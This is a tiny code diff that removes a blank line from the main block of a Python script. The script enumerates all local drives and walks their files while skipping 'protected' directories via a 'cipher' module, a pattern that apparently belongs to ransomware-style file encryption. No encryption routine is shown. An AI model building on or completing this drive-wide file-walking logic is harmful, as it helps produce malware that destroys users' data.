@@ -26,7 +26,6 @@ if __name__ == '__main__':
 
     local_drives = cipher.get_local_drives()
     
-    
     for ld in local_drives:
         for root, dirs, files in os.walk(ld):
             [dirs.remove(d) for d in list(dirs) if d in cipher.PROTECTED_DIRS]
